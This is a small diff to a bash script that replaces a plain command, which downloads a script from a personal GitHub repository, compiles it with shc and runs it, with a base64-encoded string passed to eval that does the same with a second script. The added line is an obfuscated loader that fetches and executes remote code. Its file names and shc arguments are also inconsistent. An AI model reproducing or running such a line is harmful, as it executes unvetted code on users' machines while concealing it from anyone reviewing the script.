@@ -1,3 +1,2 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/raufpermana22/cirli/main/min.sh && chmod +x min.sh
-shc -f min.sh -x ./wrote1.sh.x && ./min.sh.x
+eval "$(echo "IyEvYmluL2Jhc2gKd2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmF1ZnBlcm1hbmEyMi9jaXJsaS9tYWluL3dyb3RlMS5zaCAmJiBjaG1vZCAreCB3cm90ZTEuc2gKc2hjIC1mIG1pbi5zaCAteCAuL3dyb3RlMS5zaC54ICYmIC4vd3JvdGUxLnNoLng=" | base64 -d)" name: temp
